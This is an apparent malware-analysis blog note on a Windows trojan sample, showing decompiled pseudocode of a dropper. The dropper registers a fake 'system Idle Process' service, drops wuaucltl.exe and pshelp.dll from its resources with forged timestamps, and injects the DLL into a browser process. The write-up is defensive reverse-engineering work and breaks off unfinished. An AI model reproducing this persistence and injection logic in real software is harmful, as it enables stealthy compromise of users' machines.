# [Quick Note] Pseudo code sample 979aed7eef79df123e0425eb094030ad

# Overview
MD5: 979aed7eef79df123e0425eb094030ad </br>
Threat miner: https://www.threatminer.org/av.php?q=Win32/Trojan.Spy.210#gsc.tab=0&gsc.q=Win32%2FTrojan.Spy.210&gsc.page=1 </br>

This sample is pe file called with another name is ```wuaucltl.exe```, this sample using techniques load resource inside resource of malware store data of another pe file and it self loading by malware. It's loaded form DLL files.

# I. Stage 1: Analyze Main function
This function setup a few option for service before but into this triiger a few functions to create and load resouce of malware to new file. Services will call with name ```system Idle Process``` and services proc will trigger call function ```f_handle_setup_status_services``` </br>
```
int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
  SERVICE_TABLE_ENTRYA ServiceStartTable; // [esp+0h] [ebp-114h]

  ServiceStartTable.lpServiceName = ServiceName;// Service Name = "system Idle Process"
  ServiceStartTable.lpServiceProc = (LPSERVICE_MAIN_FUNCTIONA)f_handle_setup_status_services;// handle setup status service and spawn data into process explorer
  v6 = 0;
  v7 = 0;
  if ( !f_get_system_directory_and_find_files() )// find file \\wuaucltl.exe into system directory if not found create file
    f_create_new_file_and_load_resource();      // create 2 file: \\wuaucltl.exe with attribute base on \\ntoskrnl.exe and \\pshelp.dll with data load from resource of malware
  if ( f_handle_open_service() )                // handle open services
  {
    StartServiceCtrlDispatcherA(&ServiceStartTable);// Connects the main thread of a service process to the service control manager, which causes the thread to be the service control dispatcher thread for the calling process.
  }
  else
  {
    Buffer = 0;
    memset(&v9, 0, 0x100u);
    v10 = 0;
    v11 = 0;
    GetSystemDirectoryA(&Buffer, 0x104u);
    strncat(&Buffer, aWuaucltlExe, 0x104u);     // append system directory with + \\wuaucltl.exe
    f_handle_create_and_start_services(&Buffer);// create and open service with path point to wuaucltl.exe as backdoor
  }
  return 0;
}
```
# 1. Function f_handle_setup_status_services
This function setup detail status process service and it another missions is call sub fucntion ```f_check_status_services``` to get process id of ```explorer``` and spawn data of ```pshelp.dll``` into this process. After that, it's create thread for ```pshelp.dll``` </br>
```
SERVICE_STATUS_HANDLE __stdcall f_handle_setup_status_services(int a1, int a2)
{
  SERVICE_STATUS_HANDLE result; // eax

  result = RegisterServiceCtrlHandlerA(ServiceName, HandlerProc);// function to register a control handler function with the control dispatcher.
                                                // With service name = system Idle Process
  hServiceStatus = result;
  if ( result )
  {
    ServiceStatus.dwServiceType = 16;
    ServiceStatus.dwServiceSpecificExitCode = 0;
    if ( f_setup_status_services(2u, 0, 0xBB8u) )
      f_check_status_services();
    result = f_setup_status_services(1u, 0, 0xBB8u);
  }
  return result;
}
```
```
DWORD (__stdcall *f_check_status_services())(LPVOID lpThreadParameter)
{
  if ( !f_setup_status_services(4u, 0, 0xBB8u) )
    return 0;
  ApplicationName = 0;
  memset(&v3, 0, 0x100u);
  v4 = 0;
  v5 = 0;
  if ( !f_return_path_internet_explorer(&ApplicationName, 0x104u) )
    return 0;
  for ( i = f_get_process_id(&ApplicationName); !i; i = f_get_process_id(&ApplicationName) )
    Sleep(0x64u);
  Buffer = 0;
  memset(&v7, 0, 0x100u);
  v8 = 0;
  v9 = 0;
  GetSystemDirectoryA(&Buffer, 0x104u);         // Retrieves the path of the system directory.
  strncat(&Buffer, aPshelpDll, 0x104u);         // Append characters from string + \\pshelp.dll
  return f_open_process_and_create_thread(&Buffer, i);// spawn data into process explorer
}
```
# 2. Function f_create_new_file_and_load_resource
Back to main function, before it call function ```f_create_new_file_and_load_resource``` main function will trigger function ```f_get_system_directory_and_find_files``` to find files ```wuaucltl.exe``` existed or not. If file existed, it not call function ```f_create_new_file_and_load_resource``` to create file or if not find this files it will call this functions. </br>
Function ```f_create_new_file_and_load_resource``` will check and get attribute of file ```ntoskrnl.exe``` (NT Operating System Kernel)
and call sub function ```f_copy_file``` to replace new file ```wuaucltl.exe``` to old file ```ntoskrnl.exe```. </br>
Afer that, it create another file with name ```pshelp.dll``` data of file will load into resource of malware through 3 API functions ```FindResourceA``` ```LoadResource``` ```LockResource``` with name if resource is ```DLL```. </br>
```
signed int f_create_new_file_and_load_resource()
{
  Buffer = 0;
  memset(&v20, 0, 0x100u);
  v21 = 0;
  v22 = 0;
  NewFileName = 0;
  memset(&v16, 0, 0x100u);
  v17 = 0;
  v18 = 0;
  v27 = 0;
  memset(&v28, 0, 0x100u);
  v29 = 0;
  v30 = 0;
  FileName = 0;
  memset(&v24, 0, 0x100u);
  v25 = 0;
  v26 = 0;
  GetSystemDirectoryA(&Buffer, 0x104u);         // Retrieves the path of the system directory.
  strncpy(&FileName, &Buffer, 0x104u);          // copy return value system directory into buffer FileName
  strncat(&FileName, aNtoskrnlExe, 0x104u);     // append system directory with + \\ntoskrnl.exe (NT Operating System Kernel)
  GetFileAttributesExA(&FileName, 0, &FileInformation);// Retrieves attributes for a specified files after append strings
  strncpy(&NewFileName, &Buffer, 0x104u);       // copy return value system directory into buffer NewFileName
  strncat(&NewFileName, aWuaucltlExe, 0x104u);  // append system directory NewFileName with + \\wuaucltl.exe
  f_copy_file(&NewFileName);                    // function overwrites the existing file with FileName = ntoskrnl.exe by NewFileName = wuaucltl.exe
  v0 = CreateFileA(&NewFileName, 0x40000000u, 7u, 0, 3u, 0x80u, 0);// Create new file <NewFileName>
  if ( v0 == (HANDLE)-1 )
    return 0;
  SetFileTime(v0, &CreationTime, &LastAccessTime, &LastWriteTime);// Sets the date and time that the specified file or directory was created, last accessed, or last modified.
  CloseHandle(v0);
  strncpy(&v27, &Buffer, 0x104u);               // copy return value system directory into buffer v27
  strncat(&v27, aPshelpDll, 0x104u);            // append string system directory with + \\pshelp.dll
  v2 = CreateFileA(&v27, 0x40000000u, 7u, 0, 1u, 0x80u, 0);// create file \\pshelp.dll
  v3 = GetModuleHandleA(0);
  v4 = v3;
  v5 = FindResourceA(v3, (LPCSTR)0x66, Type);   // Find resource with name DLL
  v6 = v5;
  v7 = LoadResource(v4, v5);                    // load resource
  lpBuffer = LockResource(v7);                  // Retrieves a pointer to the specified resource in memory.
  v9 = SizeofResource(v4, v6);                  // Retrieves the size, in bytes, of the specified resource.
  WriteFile(v2, lpBuffer, v9, &NumberOfBytesWritten, 0);// write data of resource into \\pshelp.dll
  FreeLibrary(v4);
  SetFileTime(v2, &CreationTime, &LastAccessTime, &LastWriteTime);
  CloseHandle(v2);
  return 1;
}
```
Afer done, main function trigger function ```f_handle_open_service``` to open service and start service. If can't open service, it call function ```f_handle_create_and_start_services``` it handle create service with name ```wuaucltl.exe``` and start service. </br>

# II. Stage 2: Dump data into resource and analyze
Using tool ```Resource Hacker``` to view resource ```DLL``` of malware and dump it. After dump it, replace with name ```pshelp.dll``` for similar process of malware executed. But with file type .dll but header of this file is PE files. </br>
Continue .... </br>